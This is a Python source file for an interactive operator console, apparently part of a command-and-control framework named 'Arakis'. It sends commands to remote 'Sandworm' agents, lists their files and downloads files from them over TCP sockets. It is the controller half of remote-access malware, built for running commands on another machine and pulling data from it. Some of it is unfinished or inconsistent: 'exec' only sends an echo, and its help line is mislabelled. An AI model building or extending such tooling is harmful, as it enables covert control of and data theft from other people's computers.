import cmd
from colorama import Fore, Style

class SandwormCLI(cmd.Cmd):
    """
    CLI when interacting with a sandworm
    """

    def __init__(self, index, sandworm, parent_cli):
        super().__init__()
        self.index = index
        self.sandworm = sandworm # Dictionary with attributes Socket, hostname, username and tcp_listener_index
        self.parent_cli = parent_cli # arakis CLI
        self.prompt = f"(🐍 Sandworm [{index}:{sandworm["username"]}])> "


    # On override le emptyline pour que quand on rentre "enter" sans aucune commande
    # ca exécute automatiquement la dernière commande lancée
    def emptyline(self):
        """
        Override emptyline to prevent repeating the last command.
        """
        pass


    def do_exec(self, command):
        """
        Execute a command on the Sandworm
        Usage: exec <command>
        """

        if not command:
            print("Usage: exec <command>")
            return
        
        # TODO : Valider si c'est la meilleure manière de faire, probablement que non
        sent_command = "echo " + command
        self.sandworm["socket"].send(sent_command.encode() + b"\n")

        print(f"Sent command to Sandworm [{self.index}]: {command}")


    def do_list(self,  arg):
        """
        List files from remote's client directory
        Usage: list

        TODO : Add path option
        """
        tcp_server = self.parent_cli.tcp_listeners[self.sandworm["tcp_index"]][0]

        files = tcp_server.get_listing(self.sandworm["socket"])
        print(f"\nFiles from client [{self.index}]:\n{files}")
        return


    def do_download(self, file_path):
        """
        Download a file from the Sandworm
        Usage: download <remote_file_path>
        """

        # TODO : Ajouter un local file path
        if not file_path:
            print("Usage: download <remote_file_path>")
            return
        
        answer = input(f"Download {file_path} locally? (y/n) :")
        answer = answer.lower()
        print(f"Requested file '{file_path}' from sandworm [{self.index}]")
        if answer == "y" or answer == "yes":
            tcp_server = self.parent_cli.tcp_listeners[self.sandworm["tcp_index"]][0]
            success = tcp_server.download_remote_file(self.sandworm["socket"], file_path)

            if success:
                print(Fore.GREEN + f"Successfully downloaded {file_path} locally." + Style.RESET_ALL)

            else:
                print(Fore.RED + f"Error downloading {file_path} locally.." + Style.RESET_ALL)

        return


    def do_help(self, arg):
        """
        Custom help command to list hierarchical commands.
        """
        if arg:
            cmd.Cmd.do_help(self, arg)
        else:
            print("\nAvailable Commands:")
            print("  help                   - tcp help message")
            print("  download <file_path>   - download file <file_path>")
            print("  list                   - List remote files")
            print("  exec <command>         - Remove a TCP listener")
            print("  exit                   - Exit the CLI\n")


    def do_exit(self, arg):
        """
        Exit the Sandworm CLI and return to the main Arakis CLI
        """
        print(f"Exiting interaction with Sandworm [{self.index}]...")
        return True # This exits the SandwormCLI loop and returns to ArakisCLI